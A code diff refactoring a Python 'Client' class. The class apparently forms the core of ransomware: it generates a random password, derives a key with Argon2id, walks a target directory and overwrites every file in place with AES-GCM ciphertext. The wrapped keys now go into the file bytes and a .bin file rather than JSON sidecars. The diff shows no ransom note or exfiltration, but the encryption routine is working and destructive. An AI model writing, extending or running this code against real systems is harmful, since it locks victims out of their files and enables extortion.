@@ -1,6 +1,5 @@
 import os
 import secrets
-import json
 from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.keywrap import aes_key_wrap, aes_key_unwrap
@@ -30,13 +29,13 @@ class Client:
 
         return password
 
-    def generate_master_key(self, password: str) -> bytes:
+    def generate_password_key(self, password: str) -> bytes:
         """
-        Generate a master key from the given password using Argon2id KDF.
+        Generate a password key from the given password using Argon2id KDF.
 
         :param self: The Client instance.
         :param password: The password to derive the key from.
-        :return: The derived master key.
+        :return: The derived password key.
         :rtype: bytes
         """
         salt = os.urandom(16)
@@ -51,13 +50,13 @@ class Client:
             secret=None,
         )
 
-        master_key = kdf.derive(bytes(password, "utf-8"))
+        password_key = kdf.derive(bytes(password, "utf-8"))
 
-        return master_key
+        return password_key
 
-    def encrypt_file(self, file_path: str, root_key: bytes):
+    def encrypt_file(self, file_path: str, master_key: bytes):
         """
-        Encrypt a file using AES-256-GCM and store the wrapped key and metadata in a JSON file.
+        Encrypt a file using AES-256-GCM and replace its content with the wrapped key, IV, tag, and ciphertext.
 
         :param self: The Client instance.
         :param file_path: The path to the file to encrypt.
@@ -77,38 +76,28 @@ class Client:
 
         ciphertext = encryptor.update(plaintext) + encryptor.finalize()
         tag = encryptor.tag
+        wrapped_key = aes_key_wrap(master_key, key)
 
         with open(file_path, "wb") as f:
-            f.write(ciphertext)
-
-        data = {
-            "wrapped_key": aes_key_wrap(root_key, key).hex(),
-            "iv": iv.hex(),
-            "tag": tag.hex(),
-        }
-        with open(f"{file_path}.json", "w", encoding="utf-8") as f:
-            json.dump(data, f)
+            f.write(wrapped_key + iv + tag + ciphertext)
 
     def encrypt_files(self):
         """
-        Encrypt all files in the specified directory and store the wrapped root key in a JSON file.
+        Encrypt all files in the specified directory and store the wrapped master key in a binary file.
         :param self: The Client instance.
         :return: None
         """
 
         password = self.get_random_password()
-        master_key = self.generate_master_key(password)
-        root_key = os.urandom(32)
+        password_key = self.generate_password_key(password)
+        master_key = os.urandom(32)
 
         for root, _, files in os.walk(DIRECTORY_PATH):
             for file in files:
                 file_path = os.path.join(root, file)
-                self.encrypt_file(file_path, root_key)
+                self.encrypt_file(file_path, master_key)
 
-        wrapped_root_key = aes_key_wrap(master_key, root_key)
+        wrapped_master_key = aes_key_wrap(password_key, master_key)
 
-        data = {"wrapped_root_key": wrapped_root_key.hex()}
-        with open(
-            f"{DIRECTORY_PATH}/{DIRECTORY_PATH}.json", "w", encoding="utf-8"
-        ) as f:
-            json.dump(data, f)
+        with open(f"{DIRECTORY_PATH}/{DIRECTORY_PATH}.bin", "wb") as f:
+            f.write(wrapped_master_key)
